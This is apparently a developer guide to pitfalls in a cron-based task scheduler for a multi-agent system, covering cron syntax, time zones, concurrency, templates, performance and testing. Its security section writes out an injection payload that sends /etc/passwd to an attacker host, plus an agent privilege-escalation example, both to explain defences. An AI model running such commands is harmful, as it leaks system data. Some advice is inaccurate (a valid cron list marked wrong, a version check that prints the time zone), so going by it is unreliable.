# Time Event Scheduler Gotchas

Common pitfalls, edge cases, and troubleshooting guide for the Time Event Scheduler skill.

## Cron Expression Gotchas

### 1. Sunday is 0, Not 7

**Problem:** Different systems use different conventions for Sunday.

```javascript
// WRONG - Using 7 for Sunday (some systems support this, but not standard)
"0 9 * * 7"

// CORRECT - Sunday is 0
"0 9 * * 0"

// Also valid - Range including Sunday
"0 9 * * 0-6"  // Every day
"0 9 * * 1-5"  // Weekdays only
```

**Fix:** Always use 0 for Sunday, 1 for Monday, etc.

---

### 2. Month and Day-of-Month Start at 1

**Problem:** Minutes and hours are 0-indexed, but months and days are 1-indexed.

```javascript
// WRONG - Using 0 for January
"0 9 1 0 *"  // Invalid!

// CORRECT - January is 1
"0 9 1 1 *"  // January 1st at 9:00 AM

// Month ranges
"0 9 1 1-3 *"  // Jan 1st, Feb 1st, Mar 1st
```

**Ranges:**
- Minutes: 0-59 (0-indexed)
- Hours: 0-23 (0-indexed)
- Day of Month: 1-31 (1-indexed)
- Month: 1-12 (1-indexed)
- Day of Week: 0-6 (0-indexed, Sunday = 0)

---

### 3. Both Day-of-Month and Day-of-Week

**Problem:** When both fields are specified, cron uses OR logic, not AND.

```javascript
// This runs on:
// - 1st of every month, regardless of day
// - Every Monday, regardless of date
"0 9 1 * 1"  // Runs MORE often than you might think!

// To run ONLY on Mondays that are the 1st of the month, you need complex logic
// Most cron implementations can't express this directly
```

**Fix:** Use only one field (day-of-month OR day-of-week), not both.

---

### 4. Step Values Start from Minimum

**Problem:** `*/15` doesn't mean "every 15 minutes starting now", it means specific minutes.

```javascript
// This runs at: 0, 15, 30, 45 minutes past the hour
"*/15 * * * *"

// NOT at: current minute + 15, current minute + 30, etc.

// If you want to run every 15 minutes starting at minute 5:
"5,20,35,50 * * * *"
```

**Fix:** Understand that step values start from the minimum value of the range (0 for minutes).

---

### 5. Comma-Separated Values Must Be Explicit

**Problem:** You can't use ranges in comma lists directly.

```javascript
// WRONG - Range in comma list
"0 9 * * 1-3,5"  // This works, but...

// WRONG - Trying to combine ranges
"0 9 * * 1-3,5-6"  // Some parsers don't support this

// CORRECT - Explicit list
"0 9 * * 1,2,3,5,6"

// CORRECT - Single range
"0 9 * * 1-6"
```

---

## Timezone Gotchas

### 6. Daylight Saving Time Transitions

**Problem:** Schedules during DST transitions may skip or run twice.

**Scenario 1: Spring Forward (Clock moves 2:00 AM → 3:00 AM)**
```javascript
// Schedule for 2:30 AM during spring forward
"30 2 * * 0"  // This hour doesn't exist on DST transition day!

// Result: May skip entirely or run at 3:30 AM instead
```

**Scenario 2: Fall Back (Clock moves 2:00 AM → 1:00 AM)**
```javascript
// Schedule for 1:30 AM during fall back
"30 1 * * 0"  // This hour occurs TWICE!

// Result: May run twice or once (implementation-dependent)
```

**Fix:**
- Avoid scheduling during DST transition hours (2:00-3:00 AM in most US timezones)
- Use UTC for critical schedules
- Document expected behavior for DST-affected schedules

```javascript
// SAFER - Use UTC to avoid DST issues
{
  schedule: {
    expression: "0 9 * * 0",
    timezone: "UTC"  // Never has DST
  }
}

// OR - Schedule outside DST transition window
{
  schedule: {
    expression: "0 9 * * 0",  // 9:00 AM is safe
    timezone: "America/New_York"
  }
}
```

---

### 7. Timezone Database Updates

**Problem:** Timezone rules change (e.g., country changes DST policy).

**Example:** In 2018, Morocco changed its DST rules. Old timezone databases don't reflect this.

**Fix:**
- Keep timezone database (IANA) updated
- Test schedules after timezone database updates
- Document which timezone database version is in use

```bash
# Check timezone database version
node -e "console.log(Intl.DateTimeFormat().resolvedOptions().timeZone)"

# Update timezone database (varies by platform)
npm update tzdata  # If using tzdata package
```

---

### 8. Timezone Identifier Typos

**Problem:** Invalid timezone identifiers fail silently or use fallback.

```javascript
// WRONG - Common typos
timezone: "America/NewYork"  // Missing underscore
timezone: "EST"              // Not IANA format (use America/New_York)
timezone: "US/Eastern"       // Legacy format (prefer America/New_York)

// CORRECT
timezone: "America/New_York"
timezone: "Europe/London"
timezone: "Asia/Tokyo"
```

**Validation:**
```javascript
function validateTimezone(tz) {
  const validTimezones = Intl.supportedValuesOf('timeZone');
  if (!validTimezones.includes(tz)) {
    throw new Error(`Invalid timezone: ${tz}`);
  }
}
```

---

## Execution Gotchas

### 9. Missed Schedules During Downtime

**Problem:** If system is down, schedules are missed (no catch-up).

**Scenario:**
```javascript
// Schedule: Every hour at :00
"0 * * * *"

// System down from 2:00 PM to 5:00 PM
// Missed: 2:00 PM, 3:00 PM, 4:00 PM
// Next run: 6:00 PM (no catch-up for missed runs)
```

**Fix:**
- Monitor system uptime
- Implement catch-up logic for critical schedules
- Log missed executions

```javascript
function checkMissedSchedules() {
  const schedules = loadSchedules({ enabled: true });
  const now = Date.now();

  for (const schedule of schedules) {
    const timeSinceLastRun = now - schedule.last_executed;
    const expectedInterval = calculateInterval(schedule.cron_expression);

    if (timeSinceLastRun > expectedInterval * 1.5) {
      console.warn(`Schedule ${schedule.id} missed execution`);
      if (schedule.catch_up_on_missed) {
        executeSchedule(schedule.id);
      }
    }
  }
}
```

---

### 10. Clock Skew and Drift

**Problem:** System clock is inaccurate, causing schedules to drift.

**Symptoms:**
- Schedules run minutes early/late
- Increasing drift over time
- Different machines have different execution times

**Fix:**
- Use NTP (Network Time Protocol) to sync clocks
- Monitor clock drift
- Log actual vs expected execution times

```bash
# Check system time sync
timedatectl status  # Linux
systeminfo | findstr /C:"System Time"  # Windows

# Enable NTP
sudo timedatectl set-ntp true  # Linux
```

---

### 11. Concurrent Schedule Modifications

**Problem:** Multiple agents modify same schedule file simultaneously.

**Scenario:**
```javascript
// Agent 1 reads schedule
const schedule1 = loadSchedule("sched_001");
schedule1.execution_count = 5;

// Agent 2 reads schedule (before Agent 1 saves)
const schedule2 = loadSchedule("sched_001");
schedule2.enabled = false;

// Agent 1 saves (execution_count = 5)
saveSchedule(schedule1);

// Agent 2 saves (enabled = false, but execution_count = 4!)
saveSchedule(schedule2);  // LOST UPDATE!
```

**Fix:**
- Use file locking or atomic operations
- Implement optimistic locking with version numbers

```javascript
function saveSchedule(schedule) {
  const lockFile = `${schedule.id}.lock`;

  // Try to acquire lock
  if (fs.existsSync(lockFile)) {
    throw new Error("Schedule is locked by another agent");
  }

  try {
    // Create lock file
    fs.writeFileSync(lockFile, process.pid.toString());

    // Read current version
    const current = JSON.parse(fs.readFileSync(schedule.file_path));
    if (current.version !== schedule.version) {
      throw new Error("Schedule was modified by another agent");
    }

    // Increment version
    schedule.version++;

    // Save
    fs.writeFileSync(schedule.file_path, JSON.stringify(schedule));
  } finally {
    // Release lock
    fs.unlinkSync(lockFile);
  }
}
```

---

### 12. Template Variable Missing

**Problem:** Template uses {{variable}} that isn't provided at execution time.

```javascript
// Template
task_title: "Report for {{customer_name}} - {{date}}"

// Context (missing customer_name!)
const context = { date: "2025-02-09" };

// Result
task_title: "Report for {{customer_name}} - 2025-02-09"  // Oops!
```

**Fix:**
- Validate all required variables before rendering
- Provide default values for optional variables

```javascript
function renderTemplate(template, context) {
  const requiredVars = extractVariables(template);

  for (const varName of requiredVars) {
    if (!(varName in context)) {
      throw new Error(`Missing template variable: ${varName}`);
    }
  }

  return template.replace(/{{(\w+)}}/g, (match, varName) => {
    return context[varName] || match;  // Keep placeholder if not found
  });
}

function extractVariables(template) {
  const matches = template.matchAll(/{{(\w+)}}/g);
  return Array.from(matches, m => m[1]);
}
```

---

## Calendar Export Gotchas

### 13. RRULE vs Cron Differences

**Problem:** Cron and iCal RRULE have different semantics.

**Cron to RRULE Conversion:**
```javascript
// Cron: Every Sunday at 9:00 AM
"0 9 * * 0"

// RRULE equivalent
"FREQ=WEEKLY;BYDAY=SU"

// BUT: Cron uses 0-6 (Sun=0), RRULE uses SU,MO,TU,WE,TH,FR,SA
```

**Edge Cases:**
- Cron: "Last day of month" is complex
- RRULE: "BYMONTHDAY=-1" (last day)

**Fix:**
- Test conversions thoroughly
- Document conversion limitations
- Handle unsupported patterns gracefully

---

### 14. Calendar Size Limits

**Problem:** Exporting 1000+ events creates huge .ics files.

**Symptoms:**
- Calendar import fails
- Email attachments rejected (too large)
- Slow calendar app performance

**Fix:**
- Limit exported date range (e.g., next 90 days)
- Filter by event type
- Paginate large exports

```javascript
await exportToCalendar({
  schedules: allSchedules,
  options: {
    days_ahead: 90,  // Only next 3 months
    max_events: 500,  // Hard limit
    filter: { event_type: "audit" }  // Specific types only
  }
});
```

---

## Performance Gotchas

### 15. Schedule Evaluation Overhead

**Problem:** Evaluating 1000+ schedules every minute is slow.

**Bad Implementation:**
```javascript
// Evaluates ALL schedules on EVERY tick
function evaluateSchedules() {
  const allSchedules = loadAllSchedules();  // Reads 1000+ files!
  for (const schedule of allSchedules) {
    if (schedule.next_occurrence <= Date.now()) {
      executeSchedule(schedule);
    }
  }
}
```

**Fix:**
- Use index/cache to avoid reading all files
- Skip schedules not due in next N minutes

```javascript
// Only load schedules due in next 5 minutes
function evaluateSchedules() {
  const now = Date.now();
  const fiveMinutes = 5 * 60 * 1000;

  // Load index (fast)
  const index = loadScheduleIndex();

  // Filter schedules due soon
  const dueSchedules = index.filter(s =>
    s.enabled &&
    s.next_occurrence <= now + fiveMinutes
  );

  // Only load full schedule files for due schedules
  for (const indexEntry of dueSchedules) {
    if (indexEntry.next_occurrence <= now) {
      const schedule = loadSchedule(indexEntry.id);
      executeSchedule(schedule);
    }
  }
}
```

---

### 16. Blocking Task Execution

**Problem:** Scheduled task hangs, blocking all other schedules.

**Bad Implementation:**
```javascript
function executeSchedules() {
  for (const schedule of schedules) {
    executeTask(schedule);  // Blocks if task hangs!
  }
}
```

**Fix:**
- Execute tasks in parallel with timeout
- Use separate worker processes for long-running tasks

```javascript
async function executeSchedules() {
  const promises = schedules.map(schedule =>
    Promise.race([
      executeTask(schedule),
      sleep(300000).then(() => {
        throw new Error(`Task timeout: ${schedule.id}`);
      })
    ]).catch(error => {
      console.error(`Task failed: ${schedule.id}`, error);
    })
  );

  await Promise.all(promises);
}
```

---

## Security Gotchas

### 17. Prompt Injection in Templates

**Problem:** User-provided template content executes unintended code.

**Attack:**
```javascript
// Malicious user provides:
task_description: "{{date}} $(curl http://attacker.com/steal?data=$(cat /etc/passwd))"

// If template is executed in shell without sanitization:
// Attacker steals /etc/passwd!
```

**Fix:**
- Sanitize all template content
- Don't execute templates in shell context
- Escape special characters

```javascript
function sanitizeTemplate(template) {
  // Remove shell metacharacters
  return template.replace(/[$`\\!]/g, '\\$&');
}

function renderTemplate(template, context) {
  const sanitized = sanitizeTemplate(template);
  return sanitized.replace(/{{(\w+)}}/g, (match, varName) => {
    const value = context[varName] || match;
    return sanitizeValue(value);
  });
}

function sanitizeValue(value) {
  // Escape HTML/JS special chars
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
```

---

### 18. Unauthorized Schedule Creation

**Problem:** Any agent can create schedules with elevated privileges.

**Attack:**
```javascript
// Malicious watcher agent creates schedule as orch:
await createSchedule({
  name: "Malicious Task",
  prompt_template: {
    task_assignee: "orch"  // Elevate to orchestrator!
  }
});
```

**Fix:**
- Enforce agent authorization (per AGENTS.md)
- Validate schedule creator matches template assignee

```javascript
function createSchedule(schedule, creatorAgent) {
  // Only lex and orch can create schedules
  if (!["lex", "orch"].includes(creatorAgent)) {
    throw new Error("Unauthorized: only lex/orch can create schedules");
  }

  // Validate assignee
  if (schedule.prompt_template.task_assignee !== creatorAgent) {
    throw new Error("Cannot create schedule for different agent");
  }

  // Proceed with creation
  saveSchedule(schedule);
}
```

---

## Testing Gotchas

### 19. Time-Dependent Tests Are Flaky

**Problem:** Tests that depend on current time fail randomly.

**Bad Test:**
```javascript
test("schedule runs on time", async () => {
  const schedule = createSchedule({
    cron: "* * * * *",  // Every minute
    timezone: "UTC"
  });

  await sleep(60000);  // Wait 1 minute

  // FLAKY: What if test started at :59?
  expect(schedule.execution_count).toBe(1);
});
```

**Fix:**
- Mock time in tests
- Use fixed test dates
- Don't rely on sleep() for timing

```javascript
test("schedule runs on time", () => {
  const mockNow = new Date("2025-02-09T09:00:00Z");
  jest.setSystemTime(mockNow);

  const schedule = createSchedule({
    cron: "0 9 * * *",
    timezone: "UTC"
  });

  expect(schedule.next_occurrence).toBe("2025-02-09T09:00:00Z");

  // Advance time
  jest.setSystemTime(new Date("2025-02-09T09:00:01Z"));

  evaluateSchedules();

  expect(schedule.execution_count).toBe(1);
});
```

---

### 20. Timezone Tests Depend on System Timezone

**Problem:** Tests pass locally but fail in CI (different timezone).

**Bad Test:**
```javascript
test("schedule converts to local time", () => {
  const schedule = createSchedule({
    cron: "0 9 * * *",
    timezone: "America/New_York"
  });

  // FLAKY: Assumes test runs in Eastern timezone!
  expect(schedule.next_occurrence_local).toBe("9:00 AM");
});
```

**Fix:**
- Set timezone explicitly in tests
- Test multiple timezones
- Use UTC in CI

```javascript
test("schedule converts to local time", () => {
  const schedule = createSchedule({
    cron: "0 9 * * *",
    timezone: "America/New_York"
  });

  const converted = convertToTimezone(
    schedule.next_occurrence_utc,
    "America/New_York"
  );

  expect(converted).toBe("2025-02-09T09:00:00-05:00");
});
```

---

## Summary Checklist

Before deploying a schedule, verify:

- [ ] Cron expression is valid (5 or 6 fields)
- [ ] Timezone is valid IANA identifier
- [ ] DST transitions are handled (or use UTC)
- [ ] Template variables all have values
- [ ] Max occurrences is set (avoid runaway schedules)
- [ ] Timeout is configured (avoid hanging tasks)
- [ ] Error handling is in place
- [ ] Audit logging is enabled
- [ ] Agent authorization is enforced
- [ ] Template content is sanitized
- [ ] Tests are timezone-independent
- [ ] Schedule has meaningful name/description

**When in doubt:**
- Use UTC timezone (no DST issues)
- Set conservative timeouts
- Test with manual execution first
- Monitor first few executions closely
